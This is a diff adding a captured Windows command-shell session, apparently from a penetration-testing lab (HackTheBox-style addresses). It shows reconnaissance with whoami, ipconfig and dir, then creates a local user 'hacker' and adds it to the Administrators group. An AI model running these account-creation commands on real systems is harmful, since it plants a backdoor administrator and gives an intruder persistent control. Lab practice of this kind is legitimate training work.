@@ -1,0 +1,66 @@
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+c:\Users\mrb3n\Downloads>whoami
+whoami
+nta-rdp-srv01\mrb3n
+
+c:\Users\mrb3n\Downloads>ipconfig
+ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet0:
+
+   Connection-specific DNS Suffix  . : .htb
+   IPv6 Address. . . . . . . . . . . : dead:beef::f8a1:e285:126d:3b73
+   Temporary IPv6 Address. . . . . . : dead:beef::70c2:7f40:2ff2:dffb
+   Link-local IPv6 Address . . . . . : fe80::f8a1:e285:126d:3b73%4
+   IPv4 Address. . . . . . . . . . . : 10.129.43.29
+   Subnet Mask . . . . . . . . . . . : 255.255.0.0
+   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:4ddf%4
+                                       10.129.0.1
+
+Tunnel adapter isatap..htb:
+
+   Media State . . . . . . . . . . . : Media disconnected
+   Connection-specific DNS Suffix  . : .htb
+
+Tunnel adapter Teredo Tunneling Pseudo-Interface:
+
+   Connection-specific DNS Suffix  . : 
+   IPv6 Address. . . . . . . . . . . : 2001:0:2851:782c:28d9:1692:e895:c3a3
+   Link-local IPv6 Address . . . . . : fe80::28d9:1692:e895:c3a3%2
+   Default Gateway . . . . . . . . . : 
+
+c:\Users\mrb3n\Downloads>cd c:\
+cd c:\
+
+c:\>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is E8C0-6EAE
+
+ Directory of c:\
+
+07/16/2016  04:47 AM    <DIR>          PerfLogs
+05/10/2021  01:08 PM    <DIR>          Program Files
+05/10/2021  01:08 PM    <DIR>          Program Files (x86)
+05/10/2021  07:34 PM    <DIR>          Users
+05/10/2021  12:46 PM    <DIR>          Windows
+               0 File(s)              0 bytes
+
+               5 Dir(s)  21,421,400,064 bytes free
+
+c:\>net user hacker Passw0rd1 /add
+net user hacker Passw0rd1 /add
+The command completed successfully.
+
+
+c:\>net localgroup administrators hacker /add
+net localgroup administrators hacker /add
+The command completed successfully.
+
+
+c:\>
